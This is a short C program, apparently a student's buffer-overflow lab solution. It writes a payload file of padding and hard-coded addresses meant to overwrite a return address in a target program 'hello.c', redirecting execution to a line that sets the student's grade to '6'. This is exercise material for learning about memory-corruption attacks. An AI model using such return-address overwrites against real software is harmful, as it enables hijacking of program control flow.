#include <stdio.h>

int main(){
	FILE *fp;
	int i;
	fp = fopen("data6", "w+");
	fputs("Mertzanis Loukas",fp);
	for(i = 0; i <32; i++) putc('\0',fp);
	putc(56,fp); /* i = 56; //Skip overwriting unnecessary staff*/
	putc(0x68,fp); /*Overwrite return address*/
	putc(0x8b,fp); /* return to (jump) : line38 of hello.c -> grade = '6'; */
	putc(0x04,fp);
	putc(0x08,fp);
	putc(0xe0,fp); /* Don't mess up with function's argument (Name address) */
  	putc(0x65,fp);						 
  	putc(0x0d,fp);
  	putc(0x08,fp);
	return 0;
}	